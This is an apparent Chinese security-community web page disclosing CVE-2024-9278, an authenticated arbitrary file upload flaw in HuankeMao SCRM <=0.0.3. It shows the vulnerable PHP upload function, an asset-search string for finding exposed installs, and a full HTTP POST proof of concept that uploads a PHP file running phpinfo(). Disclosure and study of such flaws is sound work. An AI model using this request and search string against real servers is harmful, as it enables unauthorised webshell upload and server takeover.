
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="一个团队使用的贡献平台">
  <meta name="keywords" content="安全,团队,贡献">
  <meta name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>【原创】（CVE-2024-9278）HuankeMao SCRM &lt;=0.0.3 文件上传漏洞 | 安全团队贡献平台</title>

  <link rel="icon" type="image/ico" href="/static/img/main.ico">

  <!-- Set render engine for 360 browser -->
  <meta name="renderer" content="webkit">

  <!-- No Baidu Siteapp-->
  <meta http-equiv="Cache-Control" content="no-siteapp"/>

  <!-- Add to homescreen for Chrome on Android -->
  <meta name="mobile-web-app-capable" content="yes">

  <!-- Add to homescreen for Safari on iOS -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-title" content="安全团队贡献平台"/>

  <!-- SEO: If your mobile URL is different from the desktop URL, add a canonical link to the desktop page https://developers.google.com/webmasters/smartphone-sites/feature-phones -->
  <!--
  <link rel="canonical" href="http://www.example.com/">
  -->
  <link rel="stylesheet" href="/static/normalize.css/normalize.min.css">
  <link rel="stylesheet" href="/static/amazeui-2.7.2/dist/css/amazeui.min.css">
  <link rel="stylesheet" href="/static/css/archive.css">
  
  
<link rel="stylesheet" href="/static/css/code.css">

</head>
<body>
<header class="am-topbar am-g am-g-collapse">
<div class="am-container" style="padding-left: 0">
  <div class="am-u-sm-centered">
  <h1 class="am-topbar-brand">
    <a href="#">安全团队贡献平台</a>
  </h1>

  <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-success am-show-sm-only" data-am-collapse="{target: '#doc-topbar-collapse'}">
      <span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span>
  </button>

  <div class="am-collapse am-topbar-collapse" id="doc-topbar-collapse">
    <ul class="am-nav am-nav-pills am-topbar-nav">
      <li ><a href="/">首页</a></li>
      <!--<li ><a href="/list/">所有信息</a></li>-->
	  <li class="am-dropdown" data-am-dropdown>
        <a class="am-dropdown-toggle" data-am-dropdown-toggle href="javascript:;">
          所有信息 <span class="am-icon-caret-down"></span>
        </a>
        <ul class="am-dropdown-content">
            <li ><a href="/list/all/">所有情报</a></li>
			<li ><a href="/list/recommend/">推荐专区</a></li>
			<li ><a href="/list/wiki/">综合情报</a></li>
			<li ><a href="/list/userpost/">用户提交</a></li>
			<li ><a href="/list/school/">高校情报</a></li>
        </ul>
      </li>
      <li ><a href="/user/">排行榜</a></li>
      <li ><a href="/gift/">礼品中心</a></li>
	  <li ><a href="/search/">搜索</a></li>
      <li ><a href="/announcements/">公告</a></li>
	  <li ><a href="/ip/">IPwhois<sup>新功能</sup></a></li>
	  <li ><a href="/wooyun/" target="_blank">WooYun drops<sup>新功能</sup></a></li>
      <li class="am-dropdown" data-am-dropdown>
        <a class="am-dropdown-toggle" data-am-dropdown-toggle href="javascript:;">
          更多 <span class="am-icon-caret-down"></span>
        </a>
        <ul class="am-dropdown-content">
          
            
                <li><a href="https://wiki.shikangsi.com/cas/jump/edudata" target="_blank">edudata平台</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3629/" target="_blank">零组知识库-006应急响应目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3631/" target="_blank">零组知识库-007内网渗透目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3632/" target="_blank">零组知识库-009安全技术目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3633/" target="_blank">零组知识库-010域渗透目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3634/" target="_blank">零组知识库-011运维与二进制安全目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/cas/jump/xss" target="_blank">XSS平台</a></li>
            
          
            
                <li><a href="http://data.shikangsi.com/" target="_blank">edusrc数据分析</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/links/" target="_blank">友情链接</a></li>
            
          
            
          
            
          
            
                <li><a href="https://wiki.shikangsi.com/zone/" target="_blank">wiki社区</a></li>
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
        </ul>
      </li>
    </ul>
	
        
    <div class="am-topbar-right">
      <a class="am-btn am-btn-primary am-topbar-btn am-btn-sm" href="/add/">提交贡献</a>
    </div>
	
	<div class="am-topbar-right">
        <a class="am-btn am-btn-primary am-topbar-btn am-btn-sm" href="/login/">登录</a>
    </div>
	<div class="am-topbar-right">
        <a class="am-btn am-btn-secondary am-topbar-btn am-btn-sm" href="/register/">注册</a>
    </div>
	


  </div>
  </div>
</div>
</header>


<div class="am-container">
<div class="am-g">
  <div class="am-u-sm-centered am-u-sm-11">
      <article class="am-article">
          <div class="am-article-hd">
            <h1 class="am-article-title">【原创】（CVE-2024-9278）HuankeMao SCRM &lt;=0.0.3 文件上传漏洞</h1>
              <hr />
              <button type="button" class="am-btn am-btn-primary btn-copy" data-am-popover="{content: '已复制'}">分享</button>
              <h3>当前为私密分享，无需登录即可查看。</h3>
              <hr />
          </div>

          <table class="am-table am-table-bordered ">
              <tr>
                  <th>时间</th>
                  <th class="am-text-center am-hide-sm-down">作者</th>
				  <th width="8%" class="am-text-center am-hide-sm-down">可见性</th>
                  <th width="8%" class="am-text-center am-hide-sm-down">等级</th>
                  <th class="am-text-center am-hide-sm-down">Rank</th>
              </tr>
              <tr>
              <tr>
                  <td>2024-09-16 19:58:23</td>
                  <td class="am-text-center am-hide-sm-down"><a href="/profile/948/" class="am-link-muted">jackieya</a></td>
				  <td class="am-text-center am-hide-sm-down"><span class="am-badge am-badge-success">公开的</span></td>
                  <td class="am-text-center am-hide-sm-down"><span class="am-badge am-badge-warning">高危</span></td>
                  <td class="am-text-center am-hide-sm-down">3</td>
              </tr>
            </table>

          <div class="am-article-bd">
            <p class="">CVE-2024-9278<br>Created: 09/27/2024 07:41 AM<br>Changes: 09/27/2024 07:41 AM (57)<br>Submitter: jackieya@wiki</p>
              <hr>
            <h1>漏洞描述</h1>
<blockquote>
<p>唤客猫SCRM 是一款基于企业微信的数据化精细运营服务系统，帮助企业实现智慧、简单、友好、精细 的客户运营管理。</p>
</blockquote>
<p>唤客猫SCRM &lt;=0.0.3 的管理员后台存在任意文件上传漏洞，攻击者可以利用该漏洞上传后门文件从而获取服务器权限。</p>
<pre class="codehilite"><code>- HuankeMao SCRM is a data-driven, finely operated service system based on Enterprise WeChat, helping businesses achieve intelligent, simple, friendly, and detailed customer operation management.
- There is an arbitrary file upload vulnerability in the backend of the HuanKeMao SCRM 0.0.3. Attackers can exploit this vulnerability to upload backdoor files and gain server privileges.
</code></pre>

<p>github项目地址：https://github.com/huankemao/huankemao-php</p>
<pre class="codehilite"><code>Github：https://github.com/huankemao/huankemao-php
</code></pre>

<h1>资产测绘</h1>
<p><code>body=&quot;唤客猫&quot;</code></p>
<p><img alt="null" src="/media/images/2024/09/16/4be98b13-31fe-4566-87ff-61361c216f38-esPI3ttS.png" /></p>
<p><img alt="null" src="/media/images/2024/09/16/97f4c225-699a-4210-bc10-e230b192e43c-B1lrolt1.png" /></p>
<h1>漏洞分析</h1>
<p>漏洞点位于app\admin\controller\v1\WxkConfig.php的upload_domain_verification_file函数中：</p>
<pre class="codehilite"><code>- The vulnerability is located in the `upload_domain_verification_file` function of the `WxkConfig.php` file in the `app\admin\controller\v1` directory.
</code></pre>

<pre class="codehilite"><code class="language-php">public function upload_domain_verification_file(){
        if (!isset($_FILES[&#039;domain_verification_file&#039;])){
            response(500, &#039;文件为空&#039;);
        }
        move_uploaded_file($_FILES[&#039;domain_verification_file&#039;][&#039;tmp_name&#039;], $_FILES[&#039;domain_verification_file&#039;][&#039;name&#039;]);

        response(200, &#039;操作成功&#039;, $_SERVER[&#039;HTTP_HOST&#039;] . &#039;/&#039; . $_FILES[&#039;domain_verification_file&#039;][&#039;name&#039;]);
    }
</code></pre>

<p>这里没有对上传文件进行严格校验，直接上传到网站根目录了。</p>
<pre class="codehilite"><code>- There is no verification for the upload file type here, you can directly upload the file to the website root directory
</code></pre>

<h1>POC</h1>
<p>该漏洞需要登录到后台进行利用：<br />
登录后点击页面右上角的“设置”图标</p>
<pre class="codehilite"><code>- This vulnerability requires logging into the backend for exploitation
- After logging in, click on the &quot;Settings&quot; icon in the upper right corner of the page
</code></pre>

<p><img alt="null" src="/media/images/2024/09/16/44b0c57b-cdd4-4028-8b4b-0cb2e6621c75-7vQi4j5Y.png" /></p>
<p>点击“上传校验文件”按钮</p>
<pre class="codehilite"><code>- Click the &quot;Upload verification file&quot; button
</code></pre>

<p><img alt="null" src="/media/images/2024/09/16/56aa1835-5c83-4a57-9b28-f48a6be6138c-C7INlM5O.png" /></p>
<p>上传个txt文件后抓包，将文件后缀改为php，得到下面这个poc：</p>
<pre class="codehilite"><code>- After uploading a txt file and intercepting the data packet, change the file suffix to php to obtain the following POC:
</code></pre>

<pre class="codehilite"><code class="language-php">POST /admin.php/upload_domain_verification_file HTTP/1.1
Host: 127.0.0.1:83
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Length: 685

------WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Disposition: form-data; name=&quot;time&quot;

1726487021
------WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Disposition: form-data; name=&quot;user_id&quot;

71712684-324d-dbcc-f654-fee216e6453e
------WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Disposition: form-data; name=&quot;token&quot;

fa4808a150e55b8aec0aa1bbea7438174e265464
------WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Disposition: form-data; name=&quot;sign&quot;

46908fde63883cae06d059a4972809dd
------WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Disposition: form-data; name=&quot;domain_verification_file&quot;; filename=&quot;1.php&quot;
Content-Type: text/plain

&lt;?php phpinfo();?&gt;
------WebKitFormBoundaryYUNSO2a0qBTk9UVQ--
</code></pre>

<p>上传后访问http://127.0.0.1:83/1.php,成功执行phpinfo()代码</p>
<pre class="codehilite"><code>- Access after uploading http://127.0.0.1:83/1.php Successfully executed the php info () code
</code></pre>

<p><img alt="null" src="/media/images/2024/09/16/7c4311ca-f4b1-41a2-a9ae-49391ebdbbfb-4n5NIJzU.png" /></p>
          </div>

          


      </article>

      <hr>
      <section class="am-panel am-panel-default">
          <div class="am-panel-bd am-text-sm">
            审核评价： 没有任何评价...
          </div>
        </section>

  </div>
</div>
</div>
<div class="main-footer" style="margin:5% 0 auto;text-align:center;">
    2014-2022 © 联系邮箱：<a href="mailto:admin@sg95.cn">admin@sg95.cn</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://beian.miit.gov.cn">鄂ICP备15020128号-4</a><br>
</div>


<!--<footer class="footer" id="footer">

</footer>
-->
<script src="/static/jquery-3.3.1/dist/jquery.min.js"></script>
<script src="/static/amazeui-2.7.2/dist/js/amazeui.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.newsTicker.min.js"></script>
<script type="text/javascript" src="/js/"></script>
<script>
    const input = document.getElementById('keyword');

    $(document).on('input keypress', function(event) {
    const value = input.value;
    console.log(value); // 获取并处理输入值
    if(event.keyCode==13){
        event.preventDefault();
        event.stopPropagation();
        var url=window.location.origin+'/search/'+value;
        console.log(url);
        window.location.href=url;
    }
});
$("#searchBtn").click(function(){
var url=window.location.origin+'/search/'+$("#keyword").val();
console.log(url);
window.location.href=url;
});
$("#ipwhois").click(function(){
var url=window.location.origin+'/ip/'+$("#ip").val();
console.log(url);
window.location.href=url;
});
</script>

<script src="/static/js/archive.js"></script>
<script src="/static/clipboardjs-2.0.10/clipboard.min.js"></script>
<script type="text/javascript">
function escape(txt) {
    return txt && txt.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/'/g, '&#39;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function reply(id, touser) {
    $("#id_parent").val(id);
    touser = escape('回复 “ ' + touser + ' ”');
    touser = $('<div class="am-alert am-text-sm" id="my-alert" data-am-alert><button type="button" class="am-close">&times;</button><p>'+touser+'</p></div>')
    $('#reply-box').html(touser);
    $('#my-alert').on('closed.alert.amui', function() {
      $("#id_parent").val('');
    });
}
//修改超链接地址
$(document).ready(function(){
if($('.am-article-bd').html().indexOf('http:///article')!==-1){
$('a').each(function(){
var url=$(this).attr('href');
var localURL=window.location.origin;
url=url.replace("http://",localURL);
$(this).attr('href',url);
})
}
else{
console.log('该页面无需替换。');
}
});
</script>

</body>
</html>